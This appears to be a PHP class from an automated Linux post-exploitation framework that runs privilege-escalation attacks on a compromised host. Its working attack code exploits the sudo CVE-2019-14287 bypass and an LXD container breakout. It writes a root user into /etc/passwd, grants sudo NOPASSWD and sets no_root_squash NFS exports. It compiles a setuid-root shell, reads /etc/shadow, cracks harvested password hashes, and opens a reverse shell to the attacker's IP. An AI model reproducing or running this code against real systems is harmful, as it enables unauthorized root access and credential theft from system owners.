<?php

class check4linux8misc extends check4linux8key{

    
   

  //https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
 

    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);

    }
    

    
    public function misc2writable_files($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
    }
    
    public function misc2readable_files($stream){
        $this->ssTitre(__FUNCTION__);
        
    }
    
    public function misc2exec_files($stream){
        $this->ssTitre(__FUNCTION__);
    }
    
    public function misc2sudo8CVE_2019_14287($stream){
        $this->ssTitre(__FUNCTION__);
        $template_id_euid = "sudo -u#-1 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "sudo -u#4294967295 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
    }
    
    public function misc2sudo($stream){
        $this->ssTitre("can we sudo without supplying a password");
        $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
        $this->pentest8id($stream,$template_id_euid);
    }
    
    public function misc2container($stream){
        $this->titre(__FUNCTION__);
        $this->misc2container2lxd($stream);
        $this->misc2container2docker($stream);
    }
    
    
    public function misc2container2docker($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/docker-installation-configuration/
        
        $this->note("specific checks - check to see if we're in a docker container");
        
        $data = "docker ps";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -i docker /proc/self/cgroup  2>/dev/null; find / -name \"*dockerenv*\" -exec ls -la {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - check to see if we're a docker host");
        $data = "docker --version 2>/dev/null; docker ps -a 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we a member of the docker group");
        $data = "id | grep -i docker 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are there any docker files present");
        $data = "find / -name Dockerfile -o -name docker-compose.yml -exec ls -l {} 2>/dev/null \;";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we in an lxd/lxc container");
        $data = "grep -qa container=lxc /proc/1/environ 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we a member of the lxd group");
        $data = "id | grep -i lxd 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
    }
    
    public function misc2container2lxd($stream){
        $this->ssTitre(__FUNCTION__);
        /*
         wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias
lxc launch SomeAlias MyMachine
         */
        $attacker_ip = $this->ip4addr4target($this->ip);

        

        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-root.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-root.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-root.tar.xz ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-lxd.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-lxd.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-lxd.tar.xz ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
               
        $data = "lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc list";
        $this->req_str($stream,$data,$this->stream_timeout,"");
                
        $data = "lxc init SomeAlias test -c security.privileged=true";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc start test";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc exec test bash ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $template_id_euid = "lxc exec test bash -c %ID%";
        $this->pentest8id($stream,$template_id_euid);
        
        
        
        $data = "lxc launch SomeAlias MyMachine";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        

    }
    
    
    
    public function misc($stream){
        $this->titre(__FUNCTION__);
        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd($stream);$this->pause();
       return 0 ;
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287($stream);$this->pause();       
       if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2container($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->key($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd($stream);$this->pause();
    }
    
    

    
    
    
    public function misc2etc_shadow($stream){
        $this->ssTitre(__FUNCTION__);
        $filename = "/etc/shadow";
        $obj_filename = new FILE($filename);
        
        
        
        if ($this->file4readable($obj_filename->file_path)){
        
        $data = "grep -v -e '^$' /etc/passwd | grep ':'  | grep -v '^#' | sort -u 2>/dev/null";
        
        $lines_passwd = $this->req_str($stream,$data,$this->stream_timeout,"");
        $lines_passwd_str = $this->requette("echo \"$lines_passwd\"  | grep -v 'CMD:' ");
        $result .= $lines_passwd;
        
        $data = "grep -v -e '^$' /etc/shadow /etc/shadow~ | grep ':'  | grep -v '^#' | sort -u 2>/dev/null ";
        
        $lines_shadow = $this->req_str($stream,$data,$this->stream_timeout,"");
        $lines_shadow_str = $this->requette("echo \"$lines_shadow\"  | grep -v 'CMD:' ");
        $result .= $lines_shadow;
        
        
        if(!empty($lines_shadow_str)) {
            $this->root8shadow($lines_shadow_str, $lines_passwd_str);  
        }
        }

    }
     
    public function bin4syscall($stream,$lan_bin_path){
        $this->ssTitre(__FUNCTION__);
        $strace_bin_rst = array();

        $lan_bin_path = trim($lan_bin_path);
        $data = "strace -e trace=execve -v -o /dev/stdout -f $lan_bin_path 2>&1 | grep -i 'execve(' | grep \"execve(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\,\" | grep -Po \"execve\\\(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\, \\\"[a-z]{2,}\\\"\\\]\\\,\"";
        $strace_bin = trim($this->req_str($stream,$data,$this->stream_timeout*3,""));
        if (preg_match('#execve\(\"/bin/sh\", \[\"sh\", \"-c\", \"(?<syscall>[[:print:]]{2,})\"\],#',$strace_bin,$strace_bin_rst))
        {
            if (isset($strace_bin_rst['syscall'])){
                $this->article("SysCall",$strace_bin_rst['syscall']);
                return $strace_bin_rst['syscall'];

            }
        }
        else {
            $this->note("Not found execve into $lan_bin_path");
            return array("");
        }
    }
   
    public function misc2user8pass8remote($stream,$username,$userpass,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $ssh_port = trim($ssh_port);

        
        $stream = $this->stream8ssh8passwd($this->ip,$ssh_port,$username,$userpass);;
        
        if(is_resource($stream)){
            $info = "SSH Pass:$userpass";
            $this->log2succes($info);
            $template_shell = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%SHELL%\" -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null ";
            
            $templateB64_shell = base64_encode($template_shell);
            $attacker_ip = $this->ip4addr4target($this->ip);
            $attacker_port = rand(1024,65535);
            $shell = "/bin/bash";
            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
            
            $lprotocol = 'T' ;
            $type = "server";
            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
        }
    }
    
    public function misc2user8pass8local($stream,$username,$userpass,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $ssh_port = trim($ssh_port);
        
        $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
        $template_id_euid = "(echo '$userpass'; sleep 3; ) | ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
        $this->pentest8id($stream,$template_id_euid);
        //===============================================================
    }
    
     

    public function users2pass($stream,$user2name, $user2pass){
        $this->titre(__FUNCTION__);
        $ssh_ports = $this->ip2ports4service("ssh");
        foreach ($ssh_ports as $ssh_port){
            if (empty($ssh_port)) $ssh_port = "22" ;
            if (!$this->ip2root8db($this->ip2id)) $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
            if (!$this->ip2root8db($this->ip2id)) $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
            if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,$user2name, $user2pass);
            
        }
    }
    
    
    public function users4pass($stream){
        $this->titre(__FUNCTION__);
        $ssh_ports = $this->ip2ports4service("ssh");
        
        
        foreach ($ssh_ports as $ssh_port){
            if (empty($ssh_port)) $ssh_port = "22" ;
        $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!$this->ip2root8db($this->ip2id)) {
                    $this->users2pass($stream,$user2name, $user2pass);
                }
            }
        }
    }
    }
    

    
    public function misc4passwd($stream){
        
        $this->titre(__FUNCTION__);
        $this->note("Grep hardcoded passwords");
        $this->note("Is there anything in the log file(s)");
        $data = "grep -i pass /var/log/*log 2>/dev/null";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        $data = "find / -type f -iname  \"*.php\" -exec grep -i -E \"(passwd|password|user|root|pass)\"   {} \; | grep -v \"#\"   2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("Any of the service(s) settings misconfigured ? Are any (vulnerable) plugins attached?");
        $data = "find / -type f -iname  \"*.config\" -exec grep -i -E \"(passwd|password|user|root)\"  {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "find / -type f -iname  \"*.conf\" -exec grep -i -E \"(passwd|password|user)\"   {}  \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "find / -type f -iname  \"*.cfg\" -exec grep -i -E \"(passwd|password|user|root)\"   {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("password policy information as stored in /etc/login.defs");
        $data = "grep \"^PASS_MAX_DAYS|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD\" /etc/login.defs 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "ps -eo args --user 0 --no-headers ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        $data = "cat ~/.profile  | grep -v '^#' | sort -u 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /var/mail/root";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /var/spool/mail/root";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "btmp";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "wtmp";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "udev";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "messages";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "syslog";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "debug";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "boot";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->ssTitre("looks for hidden files");
        $data = "find / -name \".*\" -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "dmesg | grep -i -E \"(segfault|root|passw)\" ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("OpenBSD");
        $data = "grep -v -e '^$' /etc/master.passwd  | grep -v '^#'  2>/dev/null ";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        $data = "grep -r -i pass /var/www/* 2>/dev/null";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        
        $this->note("htpasswd check");
        $users_pass_htpasswd = array();
        $data = "find / -name .htpasswd -print -exec cat {} \; 2>/dev/null  | grep ':' | sort -u";
        $users_pass_found = trim($this->req_str($stream,$data,$this->stream_timeout,""));
        $result .= $users_pass_found ;
        $this->article("ALL USERS FOUND", $users_pass_found);
        if(!empty($users_pass_found)){
            $tmp_users = array();
            $tmp_pass = array();
            
            exec("echo '$users_pass_found' | grep ':' > $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd   ");
            if (!file_exists("$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot")) $this->requette("/opt/john/john $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd --pot=$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot --fork=12 --wordlist:\"$this->dico_password\" ");
            $result .= $this->req_ret_str("/opt/john/john --show $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd");
            $tab_user2pass = $this->req_ret_tab("cat $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd 2> /dev/null | grep ':' ");
            
            if (!empty($tab_user2pass)){
                foreach ($tab_user2pass as $user2tmp){
                    //if (preg_match('/(?<user2name>\w+)\:(?<user2cpw>\w+)\:(?<user2uid>\d+)\:(?<user2gid>\d+)\:(?<user2full_name>\w+)\:(?<user2home>\w+)\:(?<user2shell>\w+)/',$line,$user))
                    if(!empty($user2tmp)){
                        $auth_user2name = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f1 ");
                        $auth_user2name = trim($auth_user2name);
                        $this->article("USER NAME", $auth_user2name);
                        $auth_user2pass = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f2 ");
                        $auth_user2pass = trim($auth_user2pass);
                        $this->article("USER PASSWORD", $auth_user2pass);
                        
                        if(!empty($auth_user2name)) $result .= $this->yesAUTH($this->port2id, $auth_user2name, $auth_user2pass,"crack $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd with john ");
                    }
                }
            }
            
            
            
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f1   ",$tmp_users);
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f2   ",$tmp_pass);
            if( !empty($tmp_users)) $users_pass_htpasswd += [ $tmp_users[0] => $tmp_pass[0] ];
            unset($tmp_users);unset($tmp_pass);
        }
        $users_pass_htpasswd = array_unique(array_map("trim",$users_pass_htpasswd));
        foreach ($users_pass_htpasswd as $user_htpasswd_name => $user_htpasswd_pass ){
            if (!empty($user_htpasswd_name)){
                
                $result .= $this->article("User", $user_htpasswd_name);
                $result .= $this->article("PASS", $user_htpasswd_pass);
            }
        }
        $this->pause();
        return $result;
    }
    
    public function misc2etc_passwd2crackpass($stream,$username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $chaine = "Encrypted password: The ':x:' denotes encrypted password which is actually stored inside /shadow file. 
If the user does not have a password, then the password field will have an *(asterisk).";
        $this->note($chaine);

        $this->note("checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)");
        $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null";
        $hash_password = $this->req_str($stream,$data,$this->stream_timeout,"| grep \":*:\" ");
        
        return $result;
    }
    
    public function misc2etc_passwd2add($stream,$username,$userpass,$etc_passwd_lanpath){

        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $etc_passwd_lanpath = trim($etc_passwd_lanpath);
        
        $query = "mkpasswd -m SHA-512 $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $query = "openssl passwd -1 -salt $username $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $this->article("user_pass_crypt",$user_pass_crypt);
        $search = "$username:$user_pass_crypt:0:0:root:/root:/bin/sh";
        
        if (!$this->file4search8path($stream,$etc_passwd_lanpath, $search)){
            $this->file4add($stream,$etc_passwd_lanpath, $search);
        }
        $this->users2pass($stream, $username, $userpass);
    }
    
    
    public function misc2etc_passwd2nopasswd($stream,$username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        return $result;
    }
    
    public function misc2etc_passwd($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
        
        $etc_passwd_lanpath = "/etc/passwd"; // $this->file4locate($stream, $filename);
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2add($stream,$this->created_user_name, $this->created_user_pass,$etc_passwd_lanpath);
        //if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2nopasswd($stream,$this->created_user_name, $etc_passwd_lanpath);
        //if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2crackpass($stream,$this->created_user_name, $etc_passwd_lanpath);
        
   }
    
   public function misc2etc_sudoers($stream,$user2name,$user2pass){
       $this->ssTitre(__FUNCTION__);
       $etc_sudoers_path = "/etc/sudoers";
       $user2name = trim($user2name);
       $user2pass  = trim($user2pass);
       
       $search = "$user2name ALL=(ALL:ALL) NOPASSWD:ALL";
       if (!$this->file4search8path($stream,$etc_sudoers_path, $search)){
           $this->file4add($stream,$etc_sudoers_path, $search);
       }
       $template_id_euid = "echo '$user2pass' | sudo -S /bin/bash -c \"%ID%\" ";
       $this->pentest8id($stream,$template_id_euid);
       
   }
    
   public function misc4etc_sudoers($stream){
        $this->ssTitre(__FUNCTION__);
        
        $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!$this->ip2root8db($this->ip2id)) {
                    $this->misc2etc_sudoers($stream,$user2name,$user2pass);
                }
            }
        }

    }
    
  
    
    
    
 
    
    public function misc2etc_exports2setsuid($stream,$mount_rhost_path){
        $this->ssTitre(__FUNCTION__);
        $this->article("LD_PRELOAD Exploit","This attack involves .so files (part of the dynamic link library) being used by programs.
        The attacker can add a program pretending to be one of these libraries so that when a program is
        run it will execute the program pretending to be a library, this is useful if you are calling
        a program that has the suid bit set to root, this. 
        So when the program is first run, it will attempt to load the library it requires
        (but it has been replaced with code the attacker wants executed) and thus runs the commands
        in the program placed by the attacker, with the permissions of the owner of the calling program.");
        $suid = <<<EOC
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
        // execl("/bin/sh","sh",(char*)0);
        }
EOC;
        $data = "echo '$suid' > $this->vm_tmp_lin/suid.c ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "gcc -m32 -o $this->vm_tmp_lin/suid $this->vm_tmp_lin/suid.c ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod u+s $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod 4755 $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "mount $mount_rhost_path /tmp";
        $result .= $this->req_ret_str($data);
        $this->pause();
        
        $template_id_euid = "$this->vm_tmp_lin/suid %ID%";

        $this->pentest8id($stream,$template_id_euid);

        $this->pause();
        
        $result .= $this->users4root($this->created_user_name, $this->created_user_pass);
        
    }
    
    
    public function misc2etc_exports($stream){
        /*
         https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         
         Look for vulnerable/privileged components such as: mysql, sudo, udev, python
         
         
         If there is a cronjob that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.
         
         The following command will list processes running by root, permissions and NFS exports.
         
         $ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; grep -v -e '^$' /etc/exports 2>/dev/null
         
         NFS
         
         cp $shell /mnt/<share>
         chmod 4777 bash
         ./bash -p
         
         
         $result .= $this->rouge("No root");
         $cmd = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  ";
         
         
         NFS Share
         If you find that a machine has a NFS share you might be able to use that to escalate privileges if it's misconfigured.
         Check if the target machine has any NFS shares:
         
         showmount -e [host]
         
         If it does, then mount it to your filesystem:
         mount [host]:/ /tmp/
         
         If that succeeds then you can go to /tmp/share and look for interesting files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says root has created the file, then you can create a file and set it with suid-permission from your attacking machine, then execute it with your low privilege shell.
         This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the SUID-bit on it, like this:
         bash
         chmod 4777 exploit
         #include <stdio.h>
         #include <stdlib.h>
         #include <sys/types.h>
         #include <unistd.h>
         
         int main()
         {
         setuid(0);
         system("/bin/bash");
         return 0;
         }
         
         
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        $this->note("How are file-systems mounted?");
        $data = "mount";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /proc/mounts";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Provides a list of mounted file systems.
Can be used to determine where other interesting files might be located");
        $data = "cat /proc/mounts";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        

        
        $this->note("The /etc/exports file lists all directories exported by Network File System (NFS).
If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.");
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\"  2> /dev/null ";
        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  2> /dev/null ";
        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $etc_sudoers_path = "/etc/exports";
        $obj_filename = new FILE($etc_sudoers_path);
        $whoami = $this->whoami();
        
        $search_data = '/  *(rw, no_root_squash)';
        if ($this->file4writable($stream,$obj_filename->file_path)){
            if (!$this->file4search8path($stream,$obj_filename->file_path, $search_data)){
                $result .= $this->file4add($stream,$obj_filename->file_path, $search_data);
                $result .= $this->misc2etc_exports2setsuid("/");
            }
            $result .= $this->users4root($whoami, '');
        }
        
        
      

        
        return $result;
    }
    
    
    
    
    
    
    public function users($stream){
        $this->titre(__FUNCTION__);
        
        $users_passwd = $this->ip2users4passwd();        
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name, $user2pass));               
            }
        }
        $this->pause();
        
        $tab_users_shell = $this->ip2users4shell();
        foreach ($tab_users_shell as $user2name_shell)
            if (!empty($user2name_shell)) {
                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name_shell, ""));
            }
        
        if (!$this->ip2root8db($this->ip2id))  $this->users4user($stream);
        if (!$this->ip2root8db($this->ip2id)) $this->users4pass($stream);  
        
        $template_id_euid = "sudo bash -c '%ID%' ";
        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "sudo su -c '%ID%' ";
        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
    }
    
    
    
    
    
    public function users2sudoers2list($stream,$user_name,$user_pass){
        $this->titre("Linux Privilege Escalation using Sudo Rights");
        $result = "";
        $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");

        $data = "echo '$user_pass' | sudo -l -S -U '$user_name' "; // su --login '$user_name'
        $result .=  $this->req_str($this->stream,$data,$this->stream_timeout*3,"");
        $data = "sudo -l -U '$user_name' "; // su --login '$user_name'
        //$result .= $this->req_str($this->stream,$data,$this->stream_timeout*3,"");
        return $result;
    }
    
    
    
    
    
    public function users2sudoers8filepath($stream,$sudoers_str){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\"  ";
        $list_apps = exec($data);
        $result .= $list_apps;
        $tab_apps = explode(",", $list_apps);
        $tab_apps = array_unique($tab_apps);
        sort($tab_apps,SORT_STRING);
        $this->article("App Sudoers", $this->tab($tab_apps));$this->pause();
        $size = count($tab_apps);
        for ($i=0;$i<$size;$i++){
            $app = $tab_apps[$i];
            $app = trim($app);
            if (!empty($app)) {
                
                $this->article("$i/$size", $app);
                if (!$this->ip2root8db($this->ip2id)) $this->root8bin($stream,$app, TRUE, '');$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($stream,$app);$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($stream,$app);$this->pause();
            }
        }
        return $result;
    }
    
    
    
    
    public function users4user($stream){
        $this->ssTitre(__FUNCTION__);

        $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) {
                    if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,$user2name,$user2pass);
                    if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,"root",$user2pass);                    
                }
            }
        }
        if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,"root","");
    }
    
    
    
    public function users2user($stream,$user_name,$user_pass){
        $this->ssTitre(__FUNCTION__);
        $user_name = trim($user_name);
        $user_pass = trim($user_pass);
        
        $ip_attacker = $this->ip4addr4target($this->ip);
        $filename = "socat";
        $path_remotebin_socat = $this->bin2path($stream,$filename,$ip_attacker);

        $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  $path_remotebin_socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
        $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
        $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
        $this->pentest8id($stream,$template_id_euid);

        
        

   
        
    }
    
    
    
    
    
    
}
?>
